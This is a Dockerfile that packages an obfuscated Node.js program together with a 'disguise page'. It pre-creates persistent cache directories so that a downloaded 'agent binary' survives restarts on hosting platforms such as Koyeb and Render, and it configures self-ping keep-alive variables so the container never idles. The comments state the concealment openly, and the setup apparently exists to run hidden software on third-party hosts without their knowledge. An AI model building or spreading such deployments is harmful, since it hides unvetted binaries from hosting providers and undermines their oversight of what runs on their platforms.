# Base image
FROM node:18-slim

# Install dependencies
RUN apt update && apt install -y --no-install-recommends \
    unzip \
    procps \
    python3 \
    && rm -rf /var/lib/apt/lists/*

# Working directory
WORKDIR /app

# Copy package.json and install deps
COPY package.json /app/package.json
RUN npm install --omit=dev

# Copy main program (obfuscated) and disguise page
COPY index.js /app/index.js
COPY index.html /app/index.html

# Pre-create all three persistent cache dirs + subdirs.
# The Node.js code probes /root/.cache, /root/.local, /root/.npm in order
# and uses the first writable one as the base for logs/agent_cache/tmp_dl.
# Some platforms (Koyeb, Render, etc.) persist at least one of these dirs
# across container restarts, so the agent binary survives - no re-download.
RUN mkdir -p \
      /root/.cache/logs /root/.cache/agent_cache /root/.cache/tmp_dl \
      /root/.local/logs /root/.local/agent_cache /root/.local/tmp_dl \
      /root/.npm/logs   /root/.npm/agent_cache   /root/.npm/tmp_dl \
      /tmp/logs         /tmp/agent_cache         /tmp/tmp_dl && \
    chmod -R 777 /root/.cache /root/.local /root/.npm /tmp/logs /tmp/agent_cache /tmp/tmp_dl

# Expose port (will be overridden by PORT env var on most platforms)
EXPOSE 4567

# Self-ping keep-alive env vars (passed via -e at runtime)
# ALIVE_DOMAIN       External domain without protocol, e.g. abc.koyeb.app
# ALIVE_PROTOCOL     http or https, default https
# ALIVE_PATH         Path to ping, default /
# ALIVE_INTERVAL     Interval in minutes, default 5
# PORT               Override listen port (auto-set by most platforms)
# BASE_DIR / CACHE_DIR / TMP_DIR  Override cache locations (default: first writable of /root/.cache /root/.local /root/.npm /tmp)

# Start command
CMD ["node", "index.js"]
